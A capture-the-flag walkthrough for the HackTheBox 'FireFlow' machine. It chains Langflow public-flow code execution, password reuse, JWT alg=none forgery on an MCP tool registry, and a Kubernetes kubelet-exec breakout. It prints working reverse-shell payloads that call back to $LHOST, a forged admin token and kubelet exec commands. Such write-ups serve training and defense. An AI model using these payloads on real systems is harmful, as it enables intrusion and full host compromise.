# HackTheBox — FireFlow | Full Writeup

FireFlow is a Medium-difficulty Linux/Kubernetes machine built around a Langflow (AI flow-builder) deployment. The attack chain starts with an unauthenticated arbitrary-code-execution flaw in Langflow's public playground API, moves laterally through harvested application credentials to a local user, pivots into an internal MCP ("Model Context Protocol") AI Tool Registry service via a JWT `alg=none` signature-bypass, and finally escalates out of a Kubernetes pod to the underlying host by abusing a `nodes/proxy` RBAC permission against a privileged `node-exporter` pod with a `hostPath` mount.

---

## 1. Reconnaissance

```
nmap $IP -p- --open -sV -sC
```

**Result:** Two services exposed:

- `22/tcp` — OpenSSH 9.6p1 (Ubuntu)
- `443/tcp` — nginx (HTTPS)

The TLS certificate on port 443 discloses the hostname and a wildcard SAN:

```
Subject: commonName=fireflow.htb, organizationName=Task Force Nightfall
Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
```

Both `fireflow.htb` and `flow.fireflow.htb` were added to `/etc/hosts`.

---

## 2. Web Enumeration

### Main site

`fireflow.htb` serves a static informational page describing an internal "Task Force Nightfall" intelligence platform, and links to a public AI agent playground hosted at:

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

### Identifying the application

The playground is a **Langflow** instance (an open-source visual builder for LLM/agent workflows). Viewing the page source confirms the frontend bundle and title:

```
<title>Langflow</title>
```

### API surface discovery

Langflow exposes a FastAPI backend with an OpenAPI schema:

```
GET https://flow.fireflow.htb/openapi.json
```

This returned the full API definition (`"version":"1.8.2"`), revealing several endpoints of interest:

| Endpoint | Auth required? | Purpose |
|---|---|---|
| `POST /api/v1/build_public_tmp/{flow_id}/flow` | No | Build/execute a **public** flow, using client-supplied `data` (nodes/edges) |
| `GET /api/v1/build_public_tmp/{job_id}/events` | No | Stream build results for a job |
| `GET /api/v1/flows/public_flow/{flow_id}` | **No** | Return the full stored definition of a public flow, including component source code |

The `read_public_flow` endpoint (no auth) was queried directly for the flow ID advertised on the front page:

```
GET https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25
```

This disclosed the entire flow graph — `ChatInput → TextOperations → ChatOutput` — including the full Python source of every component (a `TextOperations` class implementing text-processing operations such as *Text Replace*).

---

## 3. Initial Foothold — Langflow Public Flow Arbitrary Code Execution

### The vulnerability

The `build_public_tmp` endpoint accepts an optional `data` object in its request body containing the **entire flow definition** (`nodes`, `edges`). Testing showed the backend does not validate this client-supplied graph against the flow stored server-side — modifying a component's input field (`replacement_text`) in the submitted JSON was reflected verbatim in the execution output, confirming the server executes whatever component configuration is submitted in the request, not a trusted server-side copy.

Because a Langflow "component" is defined by a `template.code.value` field containing a full Python class (compiled and instantiated server-side to run the node), an attacker who fully controls the submitted flow graph can submit an **entirely new component definition** whose Python source runs arbitrary code with no authentication.

### Exploitation

A minimal custom component (`ExploitComp`) was crafted and submitted to the public build endpoint. Its `code` field executed a reverse shell before defining the (harmless) `Component` class required to satisfy Langflow's execution pipeline:

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/$LHOST/443 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__"}],
            "field_order": ["code"]
          }
        }
      }],
      "edges": []
    }
  }'
```

**Result:** Reverse shell as `www-data` on `fireflow`:

```
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data)
```

---

## 4. Credential Harvesting — www-data → nightfall

### Langflow application secrets

```
www-data@fireflow:/var/lib/langflow$ cat secret_key
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

```
www-data@fireflow:/home$ cat /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

An attempt to reuse the Langflow superuser password locally via `su nightfall` failed (different credential store). However, the same password was reused for the local `nightfall` account's **SSH** login (classic password-reuse pattern between the application config and OS account):

```bash
ssh nightfall@$IP
```

**Result:** Shell as `nightfall`.

```
nightfall@fireflow:~$ cat user.txt
6b44924d5a6fa891b7b512572dcb8f2e
```

---

## 5. Discovery — Internal MCP AI Tool Registry

### Local enumeration

```
nightfall@fireflow:~$ sudo -l
Sorry, user nightfall may not run sudo on fireflow.

nightfall@fireflow:~$ find / -perm -4000 2>/dev/null
```

No usable SUID/sudo path was found. A hidden config file surfaced instead:

```
nightfall@fireflow:~/.mcp$ cat config.json
{
  "server": "http://$IP:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

### Fingerprinting the MCP service

```
curl -s http://$IP:30080/api/v1/version
```

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

Two facts stand out:

1. `POST /api/v1/tools` (register a new tool — i.e. arbitrary code the registry will later execute) requires the **admin** role.
2. The JWT implementation explicitly advertises support for the **`none`** signing algorithm alongside HS256.

---

## 6. Privilege Escalation — JWT `alg:none` Forgery → RCE as `mcp`

### Authenticate as a normal user

```bash
curl -s -X POST http://$IP:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

Returns a valid HS256 token for role `user`. Attempting to register a tool with it fails:

```json
{"detail":"Admin role required"}
```

### Forging an admin token

Because the service accepts unsigned tokens (`"alg":"none"`), a token can be crafted client-side with an arbitrary `role` claim and **no valid signature**, since with `alg=none` no signature is checked at all:

```
Header:  {"alg": "none", "typ": "JWT"}
Payload: {"sub": "attacker", "role": "admin"}
```

Base64url-encoding each part and joining them with dots (leaving the signature segment empty) produces a token the server accepts as authentic:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.
```

### Registering a malicious tool

With the forged admin token, a new "tool" was registered whose `code` field is a self-daemonizing Python reverse shell:

```bash
curl -s -X POST http://$IP:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"$LHOST\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
  }'
```

```json
{"status":"registered","name":"shell"}
```

### Triggering the tool

```bash
curl -s -X POST http://$IP:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

**Result:** Reverse shell as `mcp`, running **inside a Kubernetes pod**:

```
$ id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
$ hostname
mcp-server-54464cb475-29ztf
```

---

## 7. Kubernetes Service Account Abuse → Host Root

### Mounted service-account token

Every pod is automatically issued a service-account token unless explicitly disabled:

```
$ ls /var/run/secrets/kubernetes.io/serviceaccount/
```

### Enumerating our own RBAC permissions

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://$IP:443

curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

Key permission returned: the pod's service account can hit **`nodes/proxy`** — this maps to the kubelet API on each node (port `10250`), which supports pod exec/attach without further authorization checks beyond the token.

### Finding a privileged target pod

```bash
curl -sk "https://$IP:10250/pods" -H "Authorization: Bearer $TOKEN" | python3 -c '...'
```

This surfaced a **privileged** pod with a `hostPath` volume mount — `prometheus-prometheus-node-exporter` in the `monitoring` namespace — a classic monitoring DaemonSet that legitimately needs host filesystem access, and therefore an ideal target for a container breakout.

### Executing commands on the node via the kubelet exec WebSocket API

Using the `nodes/proxy` permission, a small WebSocket client (`kube_exec.py`) was used to open an `exec` stream against the privileged `node-exporter` container directly via the kubelet API (port `10250`):

```python
url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
       f"?output=1&error=1&{args}")
```

Because that container has the node's root filesystem bind-mounted (as is standard for `node-exporter`), any command executed inside it can reach the underlying host's files:

```bash
python3 exec.py "cat /host/root/root/root.txt"
```

**Result:**

```
0845554f6e9abdfee5bc83168f8b7a28
```

---

## Attack Chain

```
nmap (ports 22, 443)
  └─→ TLS cert → fireflow.htb / flow.fireflow.htb (Langflow)
        └─→ /openapi.json + /flows/public_flow/{id} (unauth info disclosure)
              └─→ build_public_tmp arbitrary component RCE → www-data
                    └─→ /etc/langflow/.env → password reuse → SSH nightfall (user.txt)
                          └─→ ~/.mcp/config.json → MCP AI Tool Registry creds
                                └─→ JWT alg:none forgery → admin role
                                      └─→ malicious tool registration → RCE as mcp (k8s pod)
                                            └─→ SA token → nodes/proxy permission
                                                  └─→ kubelet exec on privileged node-exporter pod
                                                        └─→ hostPath breakout → ROOT (host root.txt)
```

---

## Key Concepts

| Term | Explanation |
|---|---|
| Langflow | Open-source visual builder for LLM/agent pipelines ("flows" made of components) |
| Public flow | A Langflow flow marked shareable, executable without authentication via `build_public_tmp` |
| Component `code` field | Python source defining a node's behavior; compiled and executed server-side per build |
| MCP (Model Context Protocol) | Protocol for exposing "tools" (callable functions) to AI agents |
| JWT `alg:none` | A JWT signing mode with no signature; servers that honor it will trust any unsigned, attacker-crafted claims |
| Kubernetes Service Account token | Credential automatically mounted into pods for talking to the Kubernetes API |
| `SelfSubjectRulesReview` | K8s API for a caller to enumerate its own effective RBAC permissions |
| `nodes/proxy` | RBAC permission that allows proxying requests to a node's kubelet API (10250) |
| Kubelet exec API | Kubelet endpoint allowing command execution inside a running container |
| Privileged pod + hostPath | A container with elevated capabilities and the host filesystem mounted in — a common container-breakout vector |

---

## Flags

| Flag | Path |
|---|---|
| user.txt | `/home/nightfall/user.txt` |
| root.txt | `/host/root/root/root.txt` (read via privileged `node-exporter` pod breakout) |
